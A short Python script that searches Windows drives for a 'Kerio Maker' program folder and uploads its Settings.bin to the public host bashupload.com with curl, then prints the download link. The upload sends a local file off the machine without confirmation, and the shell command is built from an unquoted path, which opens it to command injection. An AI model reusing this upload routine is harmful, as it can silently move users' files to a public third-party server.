import os, string, subprocess, re
def upload(file_name):
    command = subprocess.getoutput(f"curl bashupload.com -T {file_name}")
    regex = re.search(r'(?<=wget )http://bashupload.com.*',command)
    return regex[0]
for driver in ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:\\Program Files\\Kerio Maker' % d)]:
    print(f'[{driver}]',end=' ')
    print(upload(f'{driver}\\Program Files\\Kerio Maker\\Settings.bin'))
    # with open(f'{driver}\\Program Files\\Kerio Maker\\Settings.bin','r') as setting:
        # with open('Settings.bin','w') as output:
        #     output.write(setting.read())
            # print('Done',end='!')
